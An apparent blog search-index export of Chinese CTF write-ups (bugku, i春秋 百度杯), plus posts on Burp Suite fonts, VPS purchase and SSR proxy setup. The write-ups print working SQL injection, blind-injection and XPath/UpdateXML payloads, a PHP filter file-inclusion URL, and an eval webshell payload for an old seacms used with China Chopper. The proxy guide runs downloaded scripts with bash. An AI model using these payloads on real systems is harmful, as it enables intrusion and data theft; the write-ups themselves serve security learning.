<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[bugku writeup合集(杂项、Web）]]></title>
    <url>%2F2018%2F06%2F06%2Fbugku%2F</url>
    <content type="text"><![CDATA[Webweb2滑稽，F12查看源，得到flag： 文件上传测试题目提示：请上传PHP文件，文件上传大小不允许超过1M试了几次之后，当上传php文件时提示非图片文件，上传图片时，提示非php文件，打开burpsuite，将一个php文件的后缀加上.jpg，上传时将.jpg删掉再上传即可 计算器题目给出的输入框限制了最大输入长度，F12将最大长度限制删掉就行. web基础$_GET这题有基础的都知道怎么做：代码：1234$what=$_GET[&apos;what&apos;];echo $what;if($what==&apos;flag&apos;)echo &apos;flag&#123;****&#125;&apos;; 将what提交了就行 web基础$_POST跟上题一样: 矛盾代码：1234567$num=$_GET[&apos;num&apos;];if(!is_numeric($num))&#123;echo $num;if($num==1)echo &apos;flag&#123;**********&#125;&apos;;&#125; 代码意思是当num不是个数字并且值等于1的时候输出flag：payload:URL?num=1x31提交拿到flag web3打开的时候阻止页面创建对话框 查看源码，在最底下有串代码 html码得到flag附上解码连接 sql注入这题是宽字节注入：原理：12345678910GBK 占用两字节ASCII占用一字节PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\”），MYSQL默认字符集是GBK等宽字节字符集。大家都知道%df’ 被PHP转义，单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在 %df\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。 payload:1http://103.238.227.13:10083/?id=%df%27 union select 1,string from sql5.key%23 首先，在url栏输入：1http://103.238.227.13:10083/?id=%df%27 报错了,说明可以注入 继续查看可显字段和库名：1http://103.238.227.13:10083/?id=%df%27 union select 1,database()%23 告诉你查询key表里id=1的字段：1http://103.238.227.13:10083/?id=%df%27 union select 1,string from sql5.key%23 得到flag 域名解析hint：听说把 flag.bugku.com 解析到120.24.86.145 就能拿到flag直接改host就行，这里用火狐一个插件直接改访问的host就行 直接拿到flag SQL注入1过滤代码：1234567891011121314//过滤sql$array = array(&apos;table&apos;,&apos;union&apos;,&apos;and&apos;,&apos;or&apos;,&apos;load_file&apos;,&apos;create&apos;,&apos;delete&apos;,&apos;select&apos;,&apos;update&apos;,&apos;sleep&apos;,&apos;alter&apos;,&apos;drop&apos;,&apos;truncate&apos;,&apos;from&apos;,&apos;max&apos;,&apos;min&apos;,&apos;order&apos;,&apos;limit&apos;);foreach ($array as $value)&#123; if (substr_count($id, $value) &gt; 0) &#123; exit(&apos;包含敏感关键字！&apos;.$value); &#125;&#125;//xss过滤$id = strip_tags($id);$query = &quot;SELECT * FROM temp WHERE id=&#123;$id&#125; LIMIT 1&quot;; 注入的关键词几乎都过滤了，但是看到后面有个xss过滤。查资料发现strip_tags（）函数会去除字符串里的html和php标签，思路是先在payload里插入html标签绕过sql的过滤，然后再用xss的过滤去除html的标签： 想通之后很简单，就是常规的sql注入,得到数据库名：1http://103.238.227.13:10087/?id=-1%20uni%3C%3Eon%20sel%3C%3Eect%201,databa%3C%3Ese()%23 payload:1http://103.238.227.13:10087/?id=-1 uni&lt;&gt;on sel&lt;&gt;ect 1,hash fr&lt;&gt;om sql3.key %23 查找表为key的数据表，id=1值hash字段值，得到flag 你必须让他停下这题是不停的刷新页面，用burpsuite抓包就行：多go几次就能拿到flag： 本地包含括号闭合的思路，payload：1http://120.24.86.145:8003/index.php?hello= 1);print_r(file(&quot;./flag.php&quot;) 在服务器上执行的代码是(var_dump(hello=1);print_r(file(“./flag.php”));//得到flag：flag{bug-ctf-gg-99} 反括号`在linux下起着命令替换的作用。命令替换是指shell能够将一个命令的标准输出插在一个命令行中任何位置。如下：12[root@localhost sh]# echo The date is `date` The date is 2011年 03月 14日 星期一 21:15:43 CST 单引号、双引号用于用户把带有空格的字符串赋值给变量事的分界符。如果没有单引号或双引号，shell会把空格后的字符串解释为命令。单引号和双引号的区别。单引号告诉shell忽略所有特殊字符，而双引号忽略大多数，但不包括$、\、`。例子：1234[root@localhost tmp]# echo ‘the date is `date`’ the date is `date` [root@localhost tmp]# echo “the date is `date`” the date is Fri Oct 9 00:11:56 CST 2015 eval( “var_dump($a);”);正是双引号！！！我们就可以用`了！然后用cat读取输出即可！ 变量1某春秋原题。flag In the variable !payload:1http://120.24.86.145:8004/index1.php?args=GLOBALS 参考资料 web5jsfuck右键查看源代码： 复制下来，F12放到控制台回车，得到flag： 头等舱看这个名字就感觉flag在响应头里：F12查看一下响应头，得到flag web4题目提示查看源代码， 进行了URL编码，p1解码：1function checkSubmit()&#123;var a%3ddocument.getElementById(&quot;password&quot;)%3bif(&quot;undefined&quot;!%3dtypeof a)&#123;if(&quot;67d709b2b p2解码：1aa648cf6e87a7114f1&quot;%3d%3da.value)return!0%3balert(&quot;Error&quot;)%3ba.focus()%3breturn!1&#125;&#125;document.getElementById(&quot;levelQuest&quot;).onsubmit%3dcheckSubmit%3b 大概意思就是提交的值与p1里面那段值加上54aa2再加上p2里的值相同就行拼接起来提交就行： flag在index里点进去，看看URL 一个文件包含的题，直接拿php伪协议试：payload:1http://120.24.86.145:8005/post/index.php?file=php://filter//read=convert.base64-encode/resource=index.php base64解码之后得到flag：flag{edulcni_elif_lacol_si_siht} 输入密码查看flag输入5位数密码，直接爆破 得到flag 点击一百万次查看源代码: 当clicks大于1000000时，能拿到flagF12控制台输入clicks=100000000000回车即可得到flag 备份是个好习惯备份文件获取，将index.php.bak下载下来，查看源码：12345678910111213include_once &quot;flag.php&quot;;ini_set(&quot;display_errors&quot;, 0);$str = strstr($_SERVER[&apos;REQUEST_URI&apos;], &apos;?&apos;);$str = substr($str,1);$str = str_replace(&apos;key&apos;,&apos;&apos;,$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag.&quot;取得flag&quot;;&#125;?&gt; php弱类型比较，在url栏输入： URL?key1=QNKCDZO&amp;key2=240610708 发现没啥反应，然后看了看源码，发现过滤了key双写key绕过，提交得到flagpayload:1http://120.24.86.145:8002/web16/index.php?kekeyy1=QNKCDZO&amp;kkeyey2=240610708 秋名山老司机直接访问： 很明显是算不到这么快的。只能写脚本了。附上python脚本：12345678910import requestsimport reurl = &apos;http://120.24.86.145:8002/qiumingshan/&apos;s = requests.Session()source = s.get(url)expression = re.search(r&apos;(\d+[+\-*])+(\d+)&apos;, source.text).group()result = eval(expression)post = &#123;&apos;value&apos;: result&#125;print(s.post(url, data = post).text) 这里有个正则匹配来匹配给出的表达式，然后直接用eval计算。最后将value post即可得到flag，但是计算出的表达式长度不一样，可能会超过php的最大长度所以需要多试几遍。 速度要快打开来什么都没有，就是一个你得快点： 查看源代码：1&lt;!-- OK ,now you have to post the margin what you find --&gt; 有一段提示，post margin变量what i find打开bp抓包： 响应头中有个flag,base64之后：1跑的还不错，给你flag吧: NjM4NzUy 估计是把 NjM4NzUy提交上去就行了,但是后面发现还得把NjM4NzUy解一次base64：638752这个后面再说原因。直接上python脚本：1234567891011import requestsimport base64import reurl=&apos;http://120.24.86.145:8002/web6/&apos;a=requests.session()r=a.get(url)FLAG=r.headers[&apos;flag&apos;]p=re.match(&apos;(.*)(: )(.*)&apos;,base64.b64decode(FLAG))payload=&#123;&apos;margin&apos;:base64.b64decode(p.group(3))&#125;r=a.post(url,data=payload)print(r.text) 得到flag: 这里可以看到我的脚本用了两次base64，如果只用一次的话，题目会提示你需要再快点，具体的这里就不试了同时给出php的脚本:12345678910111213141516171819202122232425262728&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;?php $url = &quot;http://120.24.86.145:8002/web6/&quot;; $contents = file_get_contents($url); $header_arr = get_headers($url); $cookie = $header_arr[5]; $cookie = explode(&apos;:&apos;,$cookie)[1]; $cookie = explode(&apos;;&apos;,$cookie)[0]; $flag = $header_arr[9]; $flag = explode(&apos;:&apos;,$flag)[1]; $flag = base64_decode($flag); $flag = explode(&apos;: &apos;,$flag)[1]; $flag = base64_decode($flag); $post_data = array(&quot;margin&quot;=&gt;$flag); $ch = curl_init(); curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); curl_setopt($ch,CURLOPT_COOKIE,$cookie); curl_setopt($ch,CURLOPT_POSTFIELDS,$post_data); $output = curl_exec($ch); curl_close($ch); print_r($output);?&gt; Misc]]></content>
      <categories>
        <category>writeup</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[“百度杯”CTF比赛 登陆 writeup]]></title>
    <url>%2F2018%2F05%2F31%2Flogindft%2F</url>
    <content type="text"><![CDATA[打开页面是一个登陆框: 查看源代码： 什么都发现不了，但是这个表单中用户名密码的class有点奇怪，先记着 随便输入用户名和密码同时打开burpsuite抓包： 用万能密码试试： 提示密码错误，但是当提交or &#39;1&#39; = &#39;2时，显示的是： 猜测是个布尔型的盲注 试了很多函数不行，最后看的wp，用的是正则表达式：username=or user() regexp '^a' %23```1234567891011121314151617181920212223我们用burpsuite进行盲注：![](http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/59736271.jpg)然后字典选择`a~z,0~9,(),_`用的都是表的常用字符,然后开始爆破：![](http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/66273786.jpg)可以知道第一位是`u`，一直持续下去可以发现这个列的名字就是前面表单用户名的`class`然后密码也是，就不仔细说了，接下来爆列:将`user()`替换成`user_n3me`：![](http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/46135022.jpg)继续爆破：![](http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/42315072.jpg)可以知道第一位是b，重复这个过程就行了最终得到用户名：`bctf3dm1n`密码：`2bfb1532857ddc0033fdae5bde3facdf`md5解密之后是:`adminqwe123666`一个个爆破可以比较麻烦，这里给出c26大佬的py脚本： import stringimport requests url = ‘http://6990a7a5194048468ddd58ba76d76945610fd134a3ad4269.game.ichunqiu.com/Challenges/login.php&#39;headers = {‘User-Agent’: “Mozilla/5.0 (X11; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0”}payloads = string.ascii_letters + string.digitstemp = ‘’for i in range(40): print(“the”+str(i)+”one”) for p in payloads: payload = temp + p name = “admin’ or user_n3me like ‘{}%’ ;#”.format(payload) data = dict(username=name, passwrod=’test’) res = requests.post(url, headers=headers, data=data) if (len(res.content) == 12): temp = temp + p print(temp.ljust(32, ‘.’)) break`换url和列名就行。 登陆进去之后是这个页面： 那个.bctfg1t看起来像个.git文件，试了一下： 果然是个.git文件，githack跑完之后： 接下来很明显就是还原版本了，git cat-file -p 哈希一直到a1开头的哈希： 出来一个文件名,我们访问他：得到flag：]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>.git泄露</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[解决burpsuite里中文不显示的方法]]></title>
    <url>%2F2018%2F05%2F31%2Fbp%2F</url>
    <content type="text"><![CDATA[burpsuite中文显示不出，某些时候非常不好用 这里用的版本是1.7.26，其他的版本修改方式没有大的区别 打开burpsuite，找到user options: 然后在display中的http message display选择成中文字体，这里选择微软雅黑： 然后就成功了]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>burpsuite</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i春秋 "百度杯" 九月场 123 writeup]]></title>
    <url>%2F2018%2F05%2F28%2F123%2F</url>
    <content type="text"><![CDATA[打开是个登陆界面： 查看一下源代码： 用户信息都在user.php里，密码的结构也告诉你了，猜想是爆破但是现在没有字典，我们先访问一下user.php，发现啥都没有，一开始以为是文件包含，但是没有变量可以用可能是备份文件获取，试试user.php.bak果然： 将文件下载下来之后发现是用户名的信息，打开burpsuite开始爆破：从1990年开始（大佬们wp写的，我也不知道为什么） 字典直接用刚刚的user.php 开始爆破： 得到了一个用户lixiuyun 密码 lixiuyun1990 登陆进去之后也是什么都没有，查看源代码： 本地构建html： php别名：php2, php3, php4, php5, phps, pht, phtm, phtml …都可以试试: 可以看到有个view.php了，打开看看这次估计真是文件包含了： 这里还有个过滤，将flag过滤了双写flag即可拿到flag：]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>爆破</tag>
        <tag>备份文件获取</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i春秋 "百度杯" 九月场 Yeser writeup]]></title>
    <url>%2F2018%2F05%2F28%2FYeserCMS%2F</url>
    <content type="text"><![CDATA[打开来是一个不知道什么cms的页面： 上cms指纹识别： 但是貌似识别不出来，想想其他方法比如搜一搜传递的变量名，也就是URL后面跟着的一大堆东西 点进去看了看，跟题目的cms差不多差不多确定是easycms了，搜一搜easycms漏洞但是找到的大多数不能用，最终还是看了大佬们写的writeup在URL/celive/live/header.php处有一个xpath注入漏洞xpath注入科普payload：第一段： xajax=Postdata&amp;xajaxargs[0]=detail=xxxxxx%2527%252C%2528UpdateXML%25281%252CCONCAT%25280x5b%252Cmid%2528%2528SELECT%252f%252a%252a%252fGROUP_CONCAT%2528concat %2528username%252C%2527%257C%2527%252Cpassword %2529%2529%2520from%2520yesercms_user %2529%252C1%252C32%2529%252C0x5d %2529%252C1%2529%2529%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%2529–%2520 第二段： xajax=Postdata&amp;xajaxargs[0]=detail=xxxxxx%2527%252C%2528UpdateXML%25281%252CCONCAT%25280x5b%252Cmid%2528%2528SELECT%252f%252a%252a%252fGROUP_CONCAT%2528concat %2528username%252C%2527%257C%2527%252Cpassword %2529%2529%2520from%2520yesercms_user %2529%252C10%252C32%2529%252C0x5d %2529%252C1%2529%2529%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%2529–%2520这里得分成两段显示： 得到管理员的账户是admin密码是md5加密的Yeser231 登陆后台： 找地方上传shell，自己找了很久没有找到地方，最后还是看的大佬的wp在模版-&gt;当前模版编辑处 点击编辑，这个时候会把这个文件名传进去，然后再显示出来这个文件的内容： 这个时候直接看到提示：flag在网站根目录下的flag.php中把id换成../../flag.php即可得到flag:]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>xpath注入</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i春秋 "百度杯" 九月场 Test writeup]]></title>
    <url>%2F2018%2F05%2F28%2Ftest%2F</url>
    <content type="text"><![CDATA[首先打开题目： 发现是一个海洋CMS，但是不太清楚版本往下翻一翻，发现有个年份 看得出是一个很老的版本了，题目的提示是：善于查资料，你就可以拿一血了好吧直接查资料：海洋cms漏洞利用 直接一大块的漏洞出来了。这里直接找到payload了：/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[cmd]) 然后打开菜刀：密码cmd连接即可： 连接成功： 可以发现在html/data下有个common.inc.php 这个是数据库的配置文件 菜刀连接数据库拿到flag:]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Centos6&7 搭建ssr科学上网及IPv6免流]]></title>
    <url>%2F2018%2F05%2F27%2Fssr%2F</url>
    <content type="text"><![CDATA[1.购买vps这里给出链接，就不仔细介绍了 2.搭建ssr连接上xshell或者其他shell软件之后，复制以下命令：wget -N https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/ssr.shchmod +x ssr.shbash ssr.sh一条一条命令执行即可，执行完之后看到的是这个页面： 选择1安装ssr，将端口号设置成443，密码写个自己能记住的密码： 加密方式选择10. aes-256-cfb 协议插件和混淆插件分别选择：2.auth_sha1_v4和tls1.2_ticket_auth 询问是否兼容原版，原版就是ss，这里选择no，选择yes的话就能支持ss客户端了： 限制的设备数、单线程限速上限、每个端口的总速度，这里都直接回车，选择默认（不限速）：(这里自用，所以没有限速和限流) 回车之后就可以开始安装了： 出来这个页面的话，证明已经安装完成了，如果嫌麻烦的话，这样已经可以直接用了，但是如果你想多端口配置也是可以的,输入:bash ssr.sh进入ssr的管理页面, 如果之前的步骤有些小问题的话这里也是可以修改的，现在我们需要切换成多端口模式： 配置跟之前的单端口一样就行，设置成功后： 直接就有一个端口，这个端口是之前单端口设置的，进入管理页面： 多端口模式下7.用户配置可以添加新的端口： 操作跟之前一样，配置成功后： 3.客户端的安装Windows：https://nofile.io/f/6Jm7WJCyOVv/ShadowsocksR-4.7.0-win.7z安卓：https://nofile.io/f/rvTJoj0h5GC/shadowsocksr-release.apk windows版解压完之后直接运行： 任务栏会出现一个小飞机：首先我们把前面ssr的链接复制下来，然后右键小飞机，选择剪贴板导入即可。 安卓的比较简单，就不仔细截图了。首先将APK安装-&gt;然后点击顶上方的“▼”-&gt;选择右下方的“+”-&gt;从剪切板导入即可(同样得复制之前的ssr链接) 4.bbr加速这一步主要是给自己的ssr提速复制以下命令到shell里: yum -y install wget wget --no-check-certificate https://github.com/teddysun/across/raw/master/bbr.sh chmod +x bbr.sh ./bbr.sh 安装完之后会提示你是否重启，选择y然后就能正常使用了。]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>免流</tag>
        <tag>科学上网</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[VPS的选择及购买]]></title>
    <url>%2F2018%2F05%2F27%2Fvps%2F</url>
    <content type="text"><![CDATA[这里主要讲述Vutrl的使用，搬瓦工也是可以的（因为都支持支付宝，简单快捷） 注册Vultr打开注册链接点击右上方的Create Account注册比较简单，输入邮箱密码创建就行进入邮箱确认，登陆后： 充值点击Billing,然后点击Make Payment下的Alipay 选择价格然后充值，第一次使用少充点，10美元就行觉得好用再继续充值就行，然后会跳转到支付宝的支付页面，用支付宝付款即可 添加服务器点击左侧的Servers可以看到右边有个“+”号：点击之后，这个页面是选择地区 在国内的话最好选择日本的服务器速度最快可以选择其他地区的比如纽约，洛杉矶，速度也不慢 选择系统类型，这里选择centos6，因为centos7的防火墙可能会导致ssr的一些服务不能用价格选择，当然是越贵越好了，但是这个好只是体现在连接的人数个人用的话选择最便宜的就行了。下方勾选Enable IPv6，需要IPv6免流的可以勾上 然后直接Deploy Now即可 这里附上一种测速方法： 使用ping命令： vutrl一开始最多可以创建5个VPS 创建完之后拿ping命令去试试速度 win+r 输入cmd 在控制台输入：ping 你的服务器IP 看看延迟就行，延迟越低速度越快 如果速度很慢的话把这个服务器删掉就行（创建5分钟之内不能消除） 连接服务器回到Servers页面点击刚刚创建的服务器这里的IP和密码待会得用到 这里有服务器的ssh我们需要使用shell软件来连接他这里演示的是xshell：从网上直接下载xshell就可以使用： 点击文件，新建 名称随便写个就行，主机处填写你服务器的IP然后点击左边的用户身份验证 用户名写root，密码从刚刚那个页面复制下来，然后点击连接就行出现这个页面就代表连接成功了:]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>vps购买</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i春秋 “百度杯”login Writeup]]></title>
    <url>%2F2018%2F05%2F26%2Flogin%2F</url>
    <content type="text"><![CDATA[首先打开来是一个登陆的页面： 看看源码有没有什么提示： 可以看到最后面注释了两个test1 我们拿test1登陆进去试试： 登陆成功。左右看看没有什么发现。打开burpsuite抓包试试: 可以看到响应包有show这个参数，并且等于0我们将show这个参数等于1发送试试: 发送之后果然出现了一段代码： 这段代码的大概意思是： 当$login['user']='ichunqiu'的时候，echo flag 但是login只能从token中获得，并且被几个函数加密了， 我们只需要照着过程逆回去即可 payload： $arr = array('user'=>'ichunqiu'); $hello = base64_encode(gzcompress(serialize('$arr'))); echo $hello; 直接解析之后echo的值就是我们需要的token值,这里解密之后是这个： eJxLtDK0qi62MrFSKi1OLVKyLraysFLKTM4ozSvMLFWyrgUAo4oKXA== 将token放到cookie里发送即可得到flag:]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i春秋"百度杯" 十月份Backdoor Write up]]></title>
    <url>%2F2018%2F05%2F26%2FBackdoor%2F</url>
    <content type="text"><![CDATA[春秋”百度杯” 十月份Backdoor Write up 首先题目提示: 敏感文件泄露 .git泄露： 使用githack将网站源码下载下来： 目录下有： 但是都是没有用的信息： 访问： .git/logs/refs/heads/master 猜想是还原版本： git checkout 734d08 然后再看看： 果然是，多试几个之后就出来一个不一样的flag文件： 访问b4ckdo0r.php： 其他地方没给什么提示，就试试有没有swp/swo文件：swp文件是vim编辑器不正常退出时产生的文件 URL/.b4ckdo0r.php.swp 或者 URL/.b4ckdo0r.php.swo 然后可以知道swp文件没有，但是`swo`文件存在 下载下来之后将后缀名`swo更改为swp` 在`linux`下进行还原 这里附上还原方法： 在linux下 假设你的swp文件叫'.index.php.swp' 可用带-r参数编辑 #vi -r index.php 然后wq保存即可 或者使用: #vi .index.php.swp 然后:recover 最后wq保存 还原出来之后是: php混淆加密，给出python脚本，参考链接将其中的URL换成题目的URL就行： 执行： python 保存的脚本名字.py b4ckdo0r.php 可以看到phpshell 执行 system('ls'); 查看即可得到flag: system('cat this_i5_flag.php');]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>.git泄露</tag>
        <tag>vim文件备份</tag>
      </tags>
  </entry>
</search>
